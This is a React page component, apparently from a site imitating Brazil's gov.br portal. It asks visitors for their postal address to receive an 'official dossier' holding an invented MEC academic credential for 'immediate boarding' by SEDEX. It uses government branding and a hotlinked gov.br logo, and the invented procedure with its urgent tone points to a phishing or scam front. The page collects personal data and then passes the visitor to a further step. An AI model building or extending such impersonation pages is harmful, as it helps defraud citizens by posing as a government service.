import { useEffect, useRef, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

const labelStyle = {
  display: 'block',
  fontSize: 13,
  fontWeight: 700,
  color: '#475569',
  marginBottom: 8,
  textTransform: 'uppercase',
}

const inputStyle = {
  width: '100%',
  padding: 12,
  border: '1px solid #cbd5e1',
  borderRadius: 4,
  fontSize: 16,
  outline: 'none',
  transition: 'border-color 0.3s',
}

function maskCep(value) {
  const m = value.replace(/\D/g, '').match(/(\d{0,5})(\d{0,3})/)
  if (!m) return value
  return !m[2] ? m[1] : m[1] + '-' + m[2]
}

export default function Endereco() {
  const navigate = useNavigate()
  const numeroRef = useRef(null)
  const [address, setAddress] = useState({
    cep: '',
    rua: '',
    numero: '',
    bairro: '',
    cidade: '',
    estado: '',
  })

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  async function handleCep(value) {
    const masked = maskCep(value)
    setAddress((p) => ({ ...p, cep: masked }))
    const clean = masked.replace(/\D/g, '')
    if (clean.length === 8) {
      try {
        const res = await fetch(`https://viacep.com.br/ws/${clean}/json/`)
        const data = await res.json()
        if (!data.erro) {
          setAddress((p) => ({
            ...p,
            rua: data.logradouro || '',
            bairro: data.bairro || '',
            cidade: data.localidade || '',
            estado: data.uf || '',
          }))
          setTimeout(() => numeroRef.current?.focus(), 200)
        }
      } catch (e) {
        // silencioso
      }
    }
  }

  function handleSubmit(e) {
    e.preventDefault()
    localStorage.setItem('user_address', JSON.stringify(address))
    navigate('/consulta-regional')
  }

  return (
    <>
      <GovHeader />

      <div className="container-gov">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <span className="text-gray-500">Expedição de Documentos Oficiais</span>
        </div>

        <div
          style={{
            background: 'white',
            borderRadius: 8,
            padding: 40,
            margin: '40px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 700,
            boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
          }}
        >
          <h1 className="text-2xl font-black text-blue-900 mb-6 border-b pb-4 uppercase italic">
            Expedição de Dossiê Físico
          </h1>
          <p className="text-gray-600 text-[13px] leading-relaxed mb-8">
            Indique o local de <strong>Expedição Oficial</strong> para o
            recebimento do <strong>Dossiê de Convocação Físico</strong>. Este
            volume contém a Credencial Acadêmica Permanente do MEC e a
            documentação original timbrada necessária para a homologação de
            embarque imediato via SEDEX Oficial com Aviso de Recebimento.
          </p>

          <form onSubmit={handleSubmit} className="space-y-5">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              <div>
                <label style={labelStyle}>CEP</label>
                <input
                  type="text"
                  value={address.cep}
                  onChange={(e) => handleCep(e.target.value)}
                  style={inputStyle}
                  placeholder="00000-000"
                  maxLength={9}
                  required
                />
              </div>
              <div className="flex items-end">
                <span className="text-[10px] text-gray-400 italic">
                  O despacho será realizado via SEDEX com Aviso de Recebimento
                  (AR).
                </span>
              </div>
            </div>

            <div className="grid grid-cols-3 gap-5">
              <div className="col-span-2">
                <label style={labelStyle}>Logradouro / Rua</label>
                <input
                  type="text"
                  value={address.rua}
                  onChange={(e) =>
                    setAddress((p) => ({ ...p, rua: e.target.value }))
                  }
                  style={inputStyle}
                  required
                />
              </div>
              <div>
                <label style={labelStyle}>Número</label>
                <input
                  ref={numeroRef}
                  type="text"
                  value={address.numero}
                  onChange={(e) =>
                    setAddress((p) => ({ ...p, numero: e.target.value }))
                  }
                  style={inputStyle}
                  required
                />
              </div>
            </div>

            <div>
              <label style={labelStyle}>Bairro</label>
              <input
                type="text"
                value={address.bairro}
                onChange={(e) =>
                  setAddress((p) => ({ ...p, bairro: e.target.value }))
                }
                style={inputStyle}
                required
              />
            </div>

            <div className="grid grid-cols-2 gap-5">
              <div>
                <label style={labelStyle}>Cidade</label>
                <input
                  type="text"
                  value={address.cidade}
                  onChange={(e) =>
                    setAddress((p) => ({ ...p, cidade: e.target.value }))
                  }
                  style={inputStyle}
                  required
                />
              </div>
              <div>
                <label style={labelStyle}>Estado (UF)</label>
                <input
                  type="text"
                  value={address.estado}
                  onChange={(e) =>
                    setAddress((p) => ({
                      ...p,
                      estado: e.target.value.toUpperCase(),
                    }))
                  }
                  style={inputStyle}
                  maxLength={2}
                  required
                />
              </div>
            </div>

            <div
              style={{
                background: '#fefce8',
                borderLeft: '4px solid #eab308',
                padding: 16,
                marginTop: 24,
              }}
            >
              <p className="text-[11px] text-yellow-800 leading-tight">
                <strong>AVISO:</strong> Documentos de viagem são de natureza
                personalíssima. Certifique-se de que haverá alguém maior de 18
                anos no local para assinar o recebimento.
              </p>
            </div>

            <button
              type="submit"
              style={{
                backgroundColor: '#1351b4',
                color: 'white',
                padding: 14,
                borderRadius: 30,
                fontWeight: 'bold',
                width: '100%',
                marginTop: 25,
                textTransform: 'uppercase',
                border: 'none',
                cursor: 'pointer',
                boxShadow:
                  '0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1)',
              }}
            >
              Confirmar Endereço de Expedição
            </button>
          </form>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}
